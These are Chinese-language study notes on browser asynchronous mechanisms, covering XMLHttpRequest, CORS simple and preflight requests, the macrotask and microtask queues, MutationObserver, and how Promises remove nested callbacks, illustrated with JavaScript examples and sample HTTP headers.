每个任务在执行过程中都有自己的调用栈，那么**同步回调就是在当前主函数的上下文中执行回调函数。**下面我们主要来看看异步回调过程，**异步回调是指回调函数在主函数之外执行**，一般有两种方式：

- 第一种是把异步函数做成一个任务，添加到信息队列尾部；
- 第二种是把异步函数添加到微任务队列中，这样就可以在当前任务的末尾处执行微任务了

#### XMLHttpRequest 运作机制

![image-20220405112129749](.\typora-user-images\image-20220405112129749.png)

从发起请求到接收数据的完整流程。

XMLHttpRequest 的用法：

```js
function GetWebData(URL) {
  /**
   * 1: 新建 XMLHttpRequest 请求对象
   */
  let xhr = new XMLHttpRequest();

  /**
   * 2: 注册相关事件回调处理函数
   */
  xhr.onreadystatechange = function () {
    switch (xhr.readyState) {
      case 0: // 请求未初始化
        console.log(' 请求未初始化 ');
        break;
      case 1: //OPENED
        console.log('OPENED');
        break;
      case 2: //HEADERS_RECEIVED
        console.log('HEADERS_RECEIVED');
        break;
      case 3: //LOADING
        console.log('LOADING');
        break;
      case 4: //DONE
        if (this.status == 200 || this.status == 304) {
          console.log(this.responseText);
        }
        console.log('DONE');
        break;
    }
  };

  xhr.ontimeout = function (e) {
    console.log('ontimeout');
  };
  xhr.onerror = function (e) {
    console.log('onerror');
  };

  /**
   * 3: 打开请求
   */
  xhr.open('Get', URL, true); // 创建一个 Get 请求, 采用异步

  /**
   * 4: 配置基础的请求信息
   */
  xhr.timeout = 3000; // 设置 xhr 请求的超时时间
  xhr.responseType = 'text'; // 设置响应返回的数据格式
  xhr.setRequestHeader('X_TEST', 'time.geekbang');

  /**
   * 5: 发送请求
   */
  xhr.send();
}
```

上面是一段利用了 XMLHttpRequest 来请求数据的代码，再结合上面的流程图，我们可以分析下这段代码是怎么执行的。

第一步：创建 XMLHttpRequest 对象。

第二步：为 xhr 对象注册回调函数。

第三步：配置基础的请求信息。

第四步：发起请求。

通过`xhr.responseType = "text"`来配置服务器返回的格式，将服务器返回的数据自动转换为自己想要的格式，如果将 responseType 的值设置为 json，那么系统会自动将服务器返回的数据转换为 JavaScript 对象格式。下面的图表是我列出的一些返回类型的描述：

![image-20220405112633993](.\typora-user-images\image-20220405112633993.png)

**假如你还需要添加自己专用的请求头属性，可以通过 xhr.setRequestHeader 来添加。**

调用`xhr.send`来发起网络请求，**渲染进程会将请求发送给网络进程**，然后网络进程负责资源的下载，等网络进程接收到数据之后，就会利用 IPC 来通知渲染进程；渲染进程接收到消息之后，会将 xhr 的回调函数封装成任务并添加到消息队列中，等主线程循环系统执行到该任务的时候，就会根据相关的状态来调用对应的回调函数。

- 如果网络请求出错了，就会执行 xhr.onerror；
- 如果超时了，就会执行 xhr.ontimeout；
- 如果是正常的数据接收，就会执行 onreadystatechange 来反馈相应的状态。

参考下 Chromium 对 XMLHttpRequest 的实现，[点击这里查看代码](https://chromium.googlesource.com/chromium/src/+/refs/heads/master/third_party/blink/renderer/core/xmlhttprequest/)。

#### XMLHttpRequest 使用过程中的问题

浏览器有很多安全策略的限制。

**1. 跨域问题**

在 A 站点中去访问不同源的 B 站点的内容，默认情况下，跨域请求是不被允许的，你可以看下面的示例代码：

```js
var xhr = new XMLHttpRequest();
var url = 'https://time.geekbang.org/';
function handler() {
  switch (xhr.readyState) {
    case 0: // 请求未初始化
      console.log(' 请求未初始化 ');
      break;
    case 1: //OPENED
      console.log('OPENED');
      break;
    case 2: //HEADERS_RECEIVED
      console.log('HEADERS_RECEIVED');
      break;
    case 3: //LOADING
      console.log('LOADING');
      break;
    case 4: //DONE
      if (this.status == 200 || this.status == 304) {
        console.log(this.responseText);
      }
      console.log('DONE');
      break;
  }
}

function callOtherDomain() {
  if (xhr) {
    xhr.open('GET', url, true);
    xhr.onreadystatechange = handler;
    xhr.send();
  }
}
callOtherDomain();
```

跨域报错：

```
Access to XMLHttpRequest at 'https://time.geekbang.org/' from origin 'https://www.geekbang.org' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

**2. HTTPS 混合内容的问题**

**HTTPS 混合内容是 HTTPS 页面中包含了不符合 HTTPS 安全要求的内容，比如包含了 HTTP 资源，通过 HTTP 加载的图像、视频、样式表、脚本等，都属于混合内容。**

通常，如果 HTTPS 请求页面中使用混合内容，浏览器会针对 HTTPS 混合内容显示警告，用来向用户表明此 HTTPS 页面包含不安全的资源。

![image-20220405113513429](.\typora-user-images\image-20220405113513429.png)

从上图可以看出，通过 HTML 文件加载的混合资源，虽然给出警告，但大部分类型还是能加载的。而使用 XMLHttpRequest 请求时，浏览器认为这种请求可能是攻击者发起的，会阻止此类危险的请求。比如我通过浏览器打开地址 https://www.iteye.com/groups ，然后通过控制台，使用 XMLHttpRequest 来请求 http://img-ads.csdn.net/2018/201811150919211586.jpg ，这时候请求就会报错，出错信息如下图所示：

![image-20220405113559518](.\typora-user-images\image-20220405113559518.png)

**setTimeout 是直接将延迟任务添加到延迟队列中**，而 **XMLHttpRequest 发起请求，是由浏览器的其他进程或者线程去执行，然后再将执行结果利用 IPC 的方式通知渲染进程，之后渲染进程再将对应的消息添加到消息队列中。**

**回调函数和系统调用栈**

问：建立 tcp 连接是在 xhr open 还是 send?

答：open 方法仅仅是配置数据，没有任何真实的连接产生，所有连接阶段都是在 send 之后。

问： fetch api 的实现是用了 xmlHttpRequest 么？如果不是，原理上有什么不同？

答：fetch 采用了 promise 来封装，在使用方式上更强现代化，同时还原生支持 async/await。在 chromium 中，fetch 是完全重新实现的，和 xmlhttprequest 没有什么关系！在项目中推荐使用 fetch。

问：跨域的请求是发送出去了，服务器也接收到了并响应了，而是在返回的时候被浏览器“拦截在门外”。

## [CORS](http://www.ruanyifeng.com/blog/2016/04/cors.html )

全称是"跨域资源共享"（Cross-origin resource sharing），它允许浏览器向跨源服务器，发出[`XMLHttpRequest`](https://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html)请求，从而克服了 AJAX 只能[同源](https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html)使用的限制。

CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。

整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。

因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。

### 两种请求

浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。

只要同时满足以下两大条件，就属于简单请求：

> （1) 请求方法是以下三种方法之一：
>
> - HEAD
> - GET
> - POST
>
> （2）HTTP 的头信息不超出以下几种字段：
>
> - Accept
> - Accept-Language
> - Content-Language
> - Last-Event-ID
> - Content-Type：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`

这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。

凡是不同时满足上面两个条件，就属于非简单请求。

浏览器对这两种请求的处理，是不一样的。

### 简单请求

#### 1.基本流程

对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个`Origin`字段。

下面是一个例子，浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个`Origin`字段。

```http
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

上面的头信息中，`Origin`字段用来说明，本次请求来自哪个源(前端项目的地址)（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。

如果`Origin`指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含`Access-Control-Allow-Origin`字段（详见下文），就知道出错了，从而抛出一个错误，被`XMLHttpRequest`的`onerror`回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。

如果`Origin`指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段：

```http
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```

上面的头信息之中，有三个与 CORS 请求相关的字段，都以`Access-Control-`开头。

**（1）Access-Control-Allow-Origin**

该字段是必须的。它的值要么是请求时`Origin`字段的值，要么是一个`*`，表示接受任意域名的请求。

**（2）Access-Control-Allow-Credentials**

该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为`true`，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为`true`，如果服务器不要浏览器发送 Cookie，删除该字段即可。

**（3）Access-Control-Expose-Headers**

该字段可选。CORS 请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到 6 个基本字段：`Cache-Control`、`Content-Language`、`Content-Type`、`Expires`、`Last-Modified`、`Pragma`。如果想拿到其他字段，就必须在`Access-Control-Expose-Headers`里面指定。上面的例子指定，`getResponseHeader('FooBar')`可以返回`FooBar`字段的值。

#### 2.withCredentials 属性

上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定`Access-Control-Allow-Credentials`字段。

```http
Access-Control-Allow-Credentials: true
```

另一方面，开发者必须在 AJAX 请求中打开`withCredentials`属性。

```javascript
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。

但是，如果省略`withCredentials`设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭`withCredentials`。

```javascript
xhr.withCredentials = false;
```

需要注意的是，如果要发送 Cookie，`Access-Control-Allow-Origin`就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的`document.cookie`也无法读取服务器域名下的 Cookie。

### 非简单请求

#### 预检请求

非简单请求是那种对服务器有特殊要求的请求，比如请求方法是`PUT`或`DELETE`，或者`Content-Type`字段的类型是`application/json`。

非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为"预检"请求（preflight）。

浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的`XMLHttpRequest`请求，否则就报错。

下面是一段浏览器的 JavaScript 脚本。

> ```javascript
> var url = 'http://api.alice.com/cors';
> var xhr = new XMLHttpRequest();
> xhr.open('PUT', url, true);
> xhr.setRequestHeader('X-Custom-Header', 'value');
> xhr.send();
> ```

上面代码中，HTTP 请求的方法是`PUT`，并且发送一个自定义头信息`X-Custom-Header`。

浏览器发现，这是一个非简单请求，就自动发出一个"预检"请求，要求服务器确认可以这样请求。下面是这个"预检"请求的 HTTP 头信息。

```http
OPTIONS /cors HTTP/1.1
Origin: http://api.bob.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

"预检"请求用的请求方法是`OPTIONS`，表示这个请求是用来询问的。头信息里面，关键字段是`Origin`，表示请求来自哪个源。

除了`Origin`字段，"预检"请求的头信息包括两个特殊字段。

**（1）Access-Control-Request-Method**

该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是`PUT`。

**（2）Access-Control-Request-Headers**

该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是`X-Custom-Header`。

#### 预检请求的回应

服务器收到"预检"请求以后，检查了`Origin`、`Access-Control-Request-Method`和`Access-Control-Request-Headers`字段以后，确认允许跨源请求，就可以做出回应。

```http
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
```

上面的 HTTP 回应中，关键的是`Access-Control-Allow-Origin`字段，表示`http://api.bob.com`可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。

```http
Access-Control-Allow-Origin: *
```

如果服务器否定了"预检"请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被`XMLHttpRequest`对象的`onerror`回调函数捕获。控制台会打印出如下的报错信息。

> ```bash
> XMLHttpRequest cannot load http://api.alice.com.
> Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
> ```

服务器回应的其他 CORS 相关字段如下。

> ```http
> Access-Control-Allow-Methods: GET, POST, PUT
> Access-Control-Allow-Headers: X-Custom-Header
> Access-Control-Allow-Credentials: true
> Access-Control-Max-Age: 1728000
> ```

**（1）Access-Control-Allow-Methods**

该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次"预检"请求。

**（2）Access-Control-Allow-Headers**

如果浏览器请求包括`Access-Control-Request-Headers`字段，则`Access-Control-Allow-Headers`字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在"预检"中请求的字段。

**（3）Access-Control-Allow-Credentials**

该字段与简单请求时的含义相同。

**（4）Access-Control-Max-Age**

该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。

#### 浏览器的正常请求和回应

一旦服务器通过了"预检"请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个`Origin`头信息字段。服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段。

下面是"预检"请求之后，浏览器的正常 CORS 请求。

> ```http
> PUT /cors HTTP/1.1
> Origin: http://api.bob.com
> Host: api.alice.com
> X-Custom-Header: value
> Accept-Language: en-US
> Connection: keep-alive
> User-Agent: Mozilla/5.0...
> ```

上面头信息的`Origin`字段是浏览器自动添加的。

下面是服务器正常的回应。

> ```http
> Access-Control-Allow-Origin: http://api.bob.com
> Content-Type: text/html; charset=utf-8
> ```

上面头信息中，`Access-Control-Allow-Origin`字段是每次回应都必定包含的。

### 与 JSONP 的比较

CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。

JSONP 只支持`GET`请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。

## 宏任务和微任务

消息队列**粗时间颗粒度**

**微任务可以在实时性和效率之间做一个有效的权衡**。

微任务已经被广泛地应用，基于微任务的技术有 MutationObserver、Promise 以及以 Promise 为基础开发出来的很多其他的技术。

### 宏任务

**页面中的大部分任务都是在主线程上执行的**，这些任务包括了：

- 渲染事件（如解析 DOM、样式计算，计算布局、绘制）；
- 用户交互事件（如鼠标点击、滚动页面、放大缩小，定时器，http 请求，，MessageChannel 等）；
- JavaScript 脚本执行事件；
- 网络请求完成、文件读写完成事件。

特别的异步方法：requestFrameAnimation 和 requestIdleCallback ,这两个任务是跟渲染相关的，不算事件环的内容。这两个方法会在 UI 渲染的过程中被固定触发。

渲染进程内部会维护多个消息队列，比如**延迟执行队列**和**普通的消息队列**。然后主线程 z 采用一个 for 循环，不断地从这些任务队列中取出任务并执行任务。我们把这些消息队列中的任务称为**宏任务**。

在[WHATWG 规范](https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model)中是怎么定义事件循环机制的。

总结 WHATWG 规范定义的大致流程：

- 先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask；
- 然后循环系统记录任务开始执行的时间，并把这个 oldestTask 设置为当前正在执行的任务；
- 当任务执行完成之后，删除当前正在执行的任务，并从对应的消息队列中删除掉这个 oldestTask；
- 最后统计执行完成的时长等信息。

宏任务可以满足我们大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，下面我们就来分析下为什么宏任务难以满足对时间精度要求较高的任务。

前面我们说过，页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。

```html
<!DOCTYPE html>
<html>
  <body>
    <div id="demo">
      <ol>
        <li>test</li>
      </ol>
    </div>
  </body>
  <script type="text/javascript">
    function timerCallback2() {
      console.log(2);
    }
    function timerCallback() {
      console.log(1);
      setTimeout(timerCallback2, 0);
    }
    setTimeout(timerCallback, 0);
  </script>
</html>
```

在这段代码中，我的目的是想通过 setTimeout 来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。

但实际情况是我们不能控制的，比如在你调用 setTimeout 来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。你可以打开 Performance 工具，来记录下这段任务的执行过程，也可参考文中我记录的图片：

![image-20220405124938405](.\typora-user-images\image-20220405124938405.png)

setTimeout 函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是 setTimeout 触发的两个定时器任务。

现在你可以重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。

所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如后面要介绍的监听 DOM 变化的需求。

### 微任务

异步回调主要有两种方式:

**第一种是把异步回调函数封装成一个宏任务，添加到消息队列尾部，当循环系统执行到该任务的时候执行回调函数**。这种比较好理解，我们前面介绍的 setTimeout 和 XMLHttpRequest 的回调函数都是通过这种方式来实现的。

**第二种方式的执行时机是在主函数执行结束之后、当前宏任务结束之前执行回调函数，这通常都是以微任务形式体现的。**

**微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。**

微任务系统是怎么运转? V8 引擎的层面分析

当一段 JS 脚本执行时，V8 会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8 引擎也会在内部创建一个**微任务队列**。这个微任务队列就是用来存放微任务的，因为在当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务了。不过这个微任务队列是给 V8 引擎内部使用的，所以你是无法通过 JavaScript 直接访问的。

也就是说每个宏任务都关联了一个微任务队列。

### 微任务产生的时机和执行微任务队列的时机

**微任务是怎么产生的？**

第一种方式是使用 MutationObserver 监控某个 DOM 节点，然后再通过 JavaScript 来修改这个节点，或者为这个节点添加、删除部分子节点，当 DOM 节点发生变化时，就会产生 DOM 变化记录的微任务。

第二种方式是使用 Promise，当调用 Promise.resolve() 或者 Promise.reject() 的时候，也会产生微任务。

通过 DOM 节点变化产生的微任务或者使用 Promise 产生的微任务都会被 JavaScript 引擎按照顺序保存到微任务队列中。

**微任务队列是何时被执行的？**

通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 **JavaScript 引擎**准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。**WHATWG 把执行微任务的时间点称为检查点**。当然除了在退出全局执行上下文式这个检查点之外。

如果在执行微任务的过程中，产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎一直循环执行微任务队列中的任务，直到队列为空才算执行结束。也就是说在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行。

![image-20220405130006969](.\typora-user-images\image-20220405130006969.png)

![image-20220405130016062](.\typora-user-images\image-20220405130016062.png)

该示意图是在执行一个 ParseHTML 的宏任务，在执行过程中，遇到了 JavaScript 脚本，那么就暂停解析流程，进入到 JavaScript 的执行环境。从图中可以看到，全局上下文中包含了微任务列表。

在 JavaScript 脚本的后续执行过程中，分别通过 Promise 和 removeChild 创建了两个微任务，并被添加到微任务列表中。接着 JavaScript 执行结束，准备退出全局执行上下文，这时候就到了检查点了，JavaScript 引擎会检查微任务列表，发现微任务列表中有微任务，那么接下来，依次执行这两个微任务。等微任务队列清空之后，就退出全局执行上下文。

以上就是微任务的工作流程，从上面分析我们可以得出如下几个**结论**：

- **微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。**
- 微任务的执行时长会影响到当前宏任务的时长。比如一个宏任务在执行过程中，产生了 100 个微任务，执行每个微任务的时间是 10 毫秒，那么执行这 100 个微任务的时间就是 1000 毫秒，也可以说这 100 个微任务让宏任务的执行时间延长了 1000 毫秒。写代码的时候一定要注意控制微任务的执行时长。
- 在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于宏任务执行。

### 监听 DOM 变化方法演变

早期页面并没有提供对监听的支持，那时要观察 DOM 是否变化，唯一能做的就是**轮询检测**，比如使用 setTimeout 或者 setInterval 来定时检测 DOM 是否有改变。这种方式简单粗暴，但是会遇到两个问题：如果时间间隔设置过长，DOM 变化响应不够及时；反过来如果时间间隔设置过短，又会浪费很多无用的工作量去检查 DOM，会让页面变得低效。

直到 2000 年的时候引入了 Mutation Event，Mutation Event 采用了**观察者的设计模式**，当 DOM 有变动时就会立刻触发相应的事件，这种方式属于同步回调。

采用 Mutation Event 解决了实时性的问题，因为 DOM 一旦发生变化，就会立即调用 JavaScript 接口。但也正是这种实时性造成了严重的性能问题，因为每次 DOM 变动，渲染引擎都会去调用 JavaScript，这样会产生较大的性能开销。比如利用 JavaScript 动态创建或动态修改 50 个节点内容，就会触发 50 次回调，而且每个回调函数都需要一定的执行时间，这里我们假设每次回调的执行时间是 4 毫秒，那么 50 次回调的执行时间就是 200 毫秒，若此时浏览器正在执行一个动画效果，由于 Mutation Event 触发回调事件，就会导致动画的卡顿。

也正是因为使用 Mutation Event 会导致页面性能问题，所以 Mutation Event 被反对使用，并逐步从 Web 标准事件中删除了。

为了解决了 Mutation Event 由于同步调用 JavaScript 而造成的性能问题，从 DOM4 开始，推荐使用 MutationObserver 来代替 Mutation Event。MutationObserver API 可以用来监视 DOM 的变化，包括属性的变化、节点的增减、内容的变化等。

首先，MutationObserver 将响应函数改成异步调用，可以不用在每次 DOM 变化都触发异步调用，而是等多次 DOM 变化后，**一次触发异步调用**，并且还会使用一个数据结构来记录这期间所有的 DOM 变化。这样即使频繁地操纵 DOM，也不会对性能造成太大的影响。

通过异步调用和减少触发次数来缓解了性能问题，那么如何保持消息通知的及时性呢？如果采用 setTimeout 创建宏任务来触发回调的话，那么实时性就会大打折扣，因为上面我们分析过，在两个任务之间，可能会被渲染进程插入其他的事件，从而影响到响应的实时性。

在每次 DOM 节点发生变化的时候，渲染引擎将变化记录封装成微任务，并将微任务添加进当前的微任务队列中。这样当执行到检查点的时候，V8 引擎就会按照顺序执行微任务了。

综上所述， MutationObserver 采用了“**异步 + 微任务**”的策略。

- 通过**异步**操作解决了同步操作的**性能问题**；
- 通过**微任务**解决了**实时性的问题**。

```js
function executor(resolve, reject) {
  let rand = Math.random();
  console.log(1);
  console.log(rand);
  if (rand > 0.5) resolve();
  else reject();
}
var p0 = new Promise(executor);

var p1 = p0.then((value) => {
  console.log('succeed-1');
  return new Promise(executor);
});

var p3 = p1.then((value) => {
  console.log('succeed-2');
  return new Promise(executor);
});

var p4 = p3.then((value) => {
  console.log('succeed-3');
  return new Promise(executor);
});

p4.catch((error) => {
  console.log('error');
});
console.log(2);
```

问题：微任务队列只存在全局执行上下文中吗？ 如果一个微任务是在一个函数执行上下文中产生了，也会保存到全局执行上下文中的微队列中吗？

问：之前讲过，在循环系统的一个循环中，先从消息队列头部取出一个任务执行，该任务执行完后，再去延迟队列中找到所有的过期任务依次执行完。那前面这句话和本篇文章的这句话好像有矛盾："先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask"

答：第一段话是 WHATWG 标准定义的，在 WHATWG 规范，定义了在主线程的循环系统中，可以有多个消息队列，比如鼠标事件的队列，IO 完成消息队列，渲染任务队列，并且可以给这些消息队列排优先级。 但是在浏览器实现的过程中，目前只有一个消息队列，和一个延迟执行队列。 一个是规范，一个是实现，主要我没有在文中强调这点，所以你会产生的这样的疑问。

问：通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。在页面生存周期内，全局执行上下文只有一份并且会一直存在调用栈中，只有当页面被关闭的时候全局执行上下文才会消失。页面都快关闭了，把全局执行上下文中的微任务队列中的任务都执行一遍，好像也没啥意义。系统应该不会做没有意义的事情，所以应该是我对全局执行上下文的某处理解有问题，但我又自查不到。

答：涉及到来了 V8 是怎么执行的了，专栏中的"全局执行上下文"我没有深入分析。所以我偷懒了，把两个稍微有点不同的概念都称为了“全局执行上下文”，要解释清楚这个问题还要牵涉到 V8 的一个底层逻辑，既然你提出来了，那我就打算在课程结束后，通过加餐的形式来开一讲，讲清楚了这个还能额外地理解 Realm 概念。

## Promise

学习一门新技术先了解这门技术的历史，它所解决的问题，抓住这门技术的本质。

Promise 到底解决了什么问题呢？（面试）

**Promise 解决的是异步编码风格的问题**，而不是一些其他的问题。

怎么让项目的代码书写得更具有连贯性。

### 异步编程的问题：代码逻辑不连续，分散

JavaScript 的异步编程模型

在执行一项耗时的任务时，比如下载网络文件任务、获取摄像头等设备信息任务，这些任务都会放到页面主线程之外的进程或者线程中去执行，这样就避免了耗时任务“霸占”页面主线程的情况。

![image-20220405141855014](.\typora-user-images\image-20220405141855014.png)

页面主线程发起一个耗时的任务，并将任务交给另外一个进程（或者同一个进程中的其他线程）去处理，这时页面主线程会继续本轮同步代码余下的部分，然后继续事件循环取出执行消息队列中的任务。等其他进程处理完任务后，会将任务添加到渲染进程的消息队列中，并排队等待循环系统的处理。排队结束之后，循环系统会取出消息队列中的任务进行处理执行。

**Web 页面的单线程架构决定了异步回调，而异步回调影响到了我们的编码方式。**

假设有一个下载的需求，使用 XMLHttpRequest 来实现，参考下面这段代码：

```js
// 执行状态
function onResolve(response) {
  console.log(response);
}
function onReject(error) {
  console.log(error);
}

let xhr = new XMLHttpRequest();
xhr.ontimeout = function (e) {
  onReject(e);
};
xhr.onerror = function (e) {
  onReject(e);
};
xhr.onreadystatechange = function () {
  onResolve(xhr.response);
};

// 设置请求类型，请求 URL，是否同步信息
let URL = 'https://time.geekbang.com';
xhr.open('Get', URL, true);

// 设置参数
xhr.timeout = 3000; // 设置 xhr 请求的超时时间
xhr.responseType = 'text'; // 设置响应返回的数据格式
xhr.setRequestHeader('X_TEST', 'time.geekbang');

// 发出请求
xhr.send();
```

执行上面这段代码，可以正常输出结果的。但是，这短短的一段代码里面竟然出现了五次回调，这么些回调分散在不同位置，会导致代码的逻辑不连贯、不线性，不符合人的直觉，这就是异步回调带来的编码方式。

封装这堆凌乱的代码，降低处理异步回调的次数。

**封装异步代码，让处理流程变得线性**

由于重点关注的是**输入内容（请求信息）和输出内容（回复信息）**，至于中间的异步请求过程，不想在代码里面体现太多，因为这会干扰核心的代码逻辑。

![image-20220405142401888](.\typora-user-images\image-20220405142401888.png)

**回调地狱**

- **第一是嵌套调用**，下一个的任务依赖上一个任务的请求结果，并**在上一个任务的回调函数内部执行新的业务逻辑**，这样当嵌套层次多了之后，代码的可读性就变得非常差了。
- **第二是任务的不确定性**，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。

原因分析出来后，问题的解决思路：

- **第一是消灭嵌套调用**；

- **第二是合并多个任务的错误处理**。

**Promise：消灭嵌套调用和多次错误处理**

```js
function XFetch(request) {
  function executor(resolve, reject) {
    let xhr = new XMLHttpRequest();
    xhr.open('GET', request.url, true);
    xhr.ontimeout = function (e) {
      reject(e);
    };
    xhr.onerror = function (e) {
      reject(e);
    };
    xhr.onreadystatechange = function () {
      if (this.readyState === 4) {
        if (this.status === 200) {
          resolve(this.responseText, this);
        } else {
          let error = {
            code: this.status,
            response: this.response
          };
          reject(error, this);
        }
      }
    };
    xhr.send();
  }
  return new Promise(executor);
}
```

利用 XFetch 来构造请求流程，代码如下：

```js
var x1 = XFetch(makeRequest('https://time.geekbang.org/?category'));
var x2 = x1.then((value) => {
  console.log(value);
  return XFetch(makeRequest('https://www.geekbang.org/column'));
});
var x3 = x2.then((value) => {
  console.log(value);
  return XFetch(makeRequest('https://time.geekbang.org'));
});
x3.catch((error) => {
  console.log(error);
});
```

Promise 是怎么消灭嵌套回调的。产生嵌套函数的一个主要原因是**在发起任务请求时会带上回调函数**，这样当任务处理结束之后，下个任务就只能在回调函数中来处理了。

**Promise 主要通过下面两步解决嵌套回调问题的。**

**首先，Promise 实现了回调函数的延时绑定**。回调函数的**绑定**在代码上的体现就是先创建 Promise 对象 x1，通过 Promise 的构造函数 executor 来执行业务逻辑；创建好 Promise 对象 x1 之后，再使用 x1.then 来设置回调函数。示范代码如下：

```js
//创建Promise对象x1，并在executor函数中执行业务逻辑
function executor(resolve, reject) {
  resolve(100);
}
let x1 = new Promise(executor);

//x1延迟绑定回调函数onResolve
function onResolve(value) {
  console.log(value);
}
x1.then(onResolve);
```

